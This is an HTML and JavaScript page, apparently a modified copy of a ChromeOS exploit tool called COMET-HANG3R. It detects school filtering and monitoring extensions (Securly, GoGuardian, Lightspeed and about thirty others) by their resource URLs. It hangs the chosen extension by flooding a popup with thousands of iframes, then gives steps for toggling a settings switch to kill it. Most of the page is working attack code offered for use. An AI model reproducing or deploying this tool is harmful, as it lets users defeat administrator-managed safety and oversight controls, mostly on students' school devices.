<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>COMET-HANG3R</title>
    <style>
      :root {
        --primary-color: #6200ff;
        --primary-glow: #4c02f7;
        --secondary-color: #8502f7;
        --text-color: #ffffff;
        --text-secondary: #9aa0a6;
        --background: #0a0a0a;
        --search-bg: rgba(32, 33, 36, 0.8);
        --hover-bg: rgba(138, 180, 248, 0.08);
        --border-color: rgba(95, 99, 104, 0.3);
        --shadow-color: rgba(98, 0, 255, 0.1);
        --card-bg: rgba(32, 33, 36, 0.8);
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
        background: var(--background);
        color: var(--text-color);
        min-height: 100vh;
        display: flex;
        flex-direction: column;
      }

      header {
        background: var(--search-bg);
        backdrop-filter: blur(10px);
        border-bottom: 1px solid var(--border-color);
        padding: 1rem;
      }

      .header-content {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 0.75rem;
      }

      .logo {
        width: 2rem;
        height: 2rem;
        color: var(--primary-color);
      }

      h1 {
        font-size: 1.875rem;
        font-weight: bold;
        background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
      }

      main {
        flex: 1;
        padding: 2rem 1rem;
      }

      .container {
        max-width: 42rem;
        margin: 0 auto;
        background: var(--search-bg);
        backdrop-filter: blur(10px);
        padding: 2rem;
        border-radius: 0.5rem;
        border: 1px solid var(--border-color);
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      }

      .description {
        color: var(--text-secondary);
        margin-bottom: 1.5rem;
        text-align: center;
      }

      .form-group {
        margin-bottom: 1.5rem;
      }

      label {
        display: block;
        font-size: 0.875rem;
        margin-bottom: 0.5rem;
      }

      select {
        width: 100%;
        background: var(--search-bg);
        border: 1px solid var(--border-color);
        color: var(--text-color);
        padding: 0.5rem;
        border-radius: 0.375rem;
        margin-bottom: 1rem;
      }

      .slider-container {
        display: flex;
        align-items: center;
        gap: 1rem;
      }

      input[type="range"] {
        flex: 1;
      }

      button {
        width: 100%;
        background: var(--primary-color);
        color: var(--text-color);
        border: none;
        padding: 0.5rem 1rem;
        border-radius: 0.375rem;
        cursor: pointer;
        transition: background-color 0.2s;
      }

      button:hover {
        background: var(--primary-glow);
      }

      button:disabled {
        opacity: 0.5;
        cursor: not-allowed;
      }

      #killButton {
        background: #dc2626;
        display: none;
      }

      #killButton:hover {
        background: #b91c1c;
      }

      #killExtensionText {
        display: none;
        text-align: center;
        color: var(--text-secondary);
        margin-top: 1rem;
      }

      footer {
        background: var(--search-bg);
        backdrop-filter: blur(10px);
        border-top: 1px solid var(--border-color);
        padding: 1rem;
        text-align: center;
        color: var(--text-secondary);
      }

      footer a {
        color: var(--primary-color);
        text-decoration: none;
      }

      footer a:hover {
        text-decoration: underline;
      }

      .overlay {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.7);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 50;
      }

      .overlay-content {
        text-align: center;
      }

      .spinner {
        width: 3rem;
        height: 3rem;
        border: 4px solid var(--primary-color);
        border-top-color: transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 1rem;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body>
    <header>
      <div class="header-content">
        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/>
          <path d="M21 3v5h-5"/>
        </svg>
        <h1>ExtHang3r</h1>
      </div>
    </header>

    <main>
      <div class="container">
        <p class="description">
          COMET-HANG3R is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of February 2025. (THIS IS A MODIFIED VERSION)
        </p>

        <div class="form-group">
          <label for="iframeSelect">Select extension:</label>
          <select id="iframeSelect"></select>
        </div>

        <div class="form-group">
          <label for="iframeCountSlider">Number of iframes:</label>
          <div class="slider-container">
            <input type="range" id="iframeCountSlider" min="100" max="15000" value="2000" step="100">
            <span id="iframeCountValue">2000</span>
          </div>
        </div>

        <button onclick="warning();" id="hangButton">Hang Extension!</button>
        <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
        <div id="killExtensionText"></div>
      </div>
    </main>

    <div class="overlay" id="overlay">
      <div class="overlay-content">
        <div class="spinner"></div>
        <p>Hanging... (This will take about 1 minute)</p>
      </div>
    </div>

    <footer>
      <p>credits to <a href="https://github.com/Blobby-Boi/">Blobby Boi</a></p>
    </footer>

    <script>
      document.addEventListener("DOMContentLoaded", function() {
        const slider = document.getElementById("iframeCountSlider");
        const sliderValueDisplay = document.getElementById("iframeCountValue");
        const deviceMemory = navigator.deviceMemory || 8;
        const defaultIframeCount = Math.round(deviceMemory * 500);
        const maxIframeCount = Math.round(deviceMemory * 3125);
        slider.value = defaultIframeCount;
        slider.max = maxIframeCount;
        sliderValueDisplay.textContent = defaultIframeCount;
        slider.addEventListener("input", function() {
          sliderValueDisplay.textContent = this.value;
        });
      });

      async function checkExtensionURL(url) {
        try {
          const response = await fetch(url);
          return response.ok;
        } catch (error) {
          return false;
        }
      }

      async function populateSelectOptions() {
        const selectElement = document.getElementById("iframeSelect");
        const extensions = {
          "Securly (3rd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
          "Securly (2nd ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
          "Securly (1st ID)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
          "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
          "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
          "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
          "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
          "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
          "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
          "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
          "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
          "Securly Classroom (2nd ID)": "chrome-extension://hkobaiihndnbfhbkmjjfbdimfbdcppdh/notfound.html",
          "Securly Classroom (1st ID)": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
          "Hapara (2nd ID)": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
          "Hapara (1st ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
          "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
          "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
          "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
          "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
          "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
          "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
          "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
          "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
          "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
          "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
          "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
          "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
          "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
          "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
          "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
          "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
          "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
          "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png"
        };

        let hasSupportedExtensions = false;
        for (const [name, url] of Object.entries(extensions)) {
          if (await checkExtensionURL(url)) {
            const option = document.createElement("option");
            option.value = url;
            option.textContent = name;
            selectElement.appendChild(option);
            hasSupportedExtensions = true;
          }
        }

        if (!hasSupportedExtensions) {
          const option = document.createElement("option");
          option.value = "";
          option.textContent = "No supported extensions installed";
          selectElement.appendChild(option);
          document.getElementById("hangButton").style.display = "none";
          document.getElementById("iframeCountSlider").style.display = "none";
          document.getElementById("iframeCountValue").style.display = "none";
        }
      }

      populateSelectOptions();

      function replaceIframes(container, iframeSrc, iframeCount) {
        for (let i = 0; i < iframeCount; i++) {
          const iframe = document.createElement('iframe');
          iframe.src = iframeSrc;
          iframe.style.width = '100%';
          iframe.style.height = '100px';
          container.appendChild(iframe);
        }
        setTimeout(function() {
          while (container.firstChild) {
            container.removeChild(container.firstChild);
          }
          replaceIframes(container, iframeSrc, iframeCount);
        }, 5);
      }

      function warning() {
        const overlay = document.getElementById("overlay");
        overlay.style.display = "flex";
        const iframeSelect = document.getElementById("iframeSelect");
        const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
        const selectedSrc = iframeSelect.value;
        const iframeCount = parseInt(document.getElementById("iframeCountSlider").value, 10);
        const popup = window.open("", "PopupWindow", "width=100,height=100");
        const popupDocument = popup.document;
        const popupBody = popupDocument.body;
        const iframeContainer = popupDocument.createElement('div');
        iframeContainer.id = 'iframeContainer';
        popupBody.appendChild(iframeContainer);
        replaceIframes(iframeContainer, selectedSrc, iframeCount);
        setTimeout(function() {
          popup.close();
          const killExtensionText = document.getElementById("killExtensionText");
          killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
          setTimeout(function() {
            overlay.style.display = "none";
            killExtensionText.style.display = "block";
            document.getElementById("killButton").style.display = "block";
            document.getElementById("hangButton").style.display = "none";
            document.getElementById("iframeSelect").style.display = "none";
            document.getElementById("iframeCountSlider").style.display = "none";
            document.getElementById("iframeCountValue").style.display = "none";
            document.getElementById("killButton").setAttribute("data-url", selectedSrc);
          }, 10000);
        }, 5000);
      }

      function openExtensionPopup() {
        const selectedSrc = document.getElementById("killButton").getAttribute("data-url");
        const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
        const killExtensionText = document.getElementById("killExtensionText");
        document.getElementById("killButton").style.display = "none";
        killExtensionText.innerHTML = "Make sure to keep this tab open. Then open <strong>chrome://extensions/?id=" + extensionId + "</strong> and flip the switch called \"Allow access to file URLs\" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
        window.location.href = selectedSrc;
      }
    </script>
  </body>
</html>
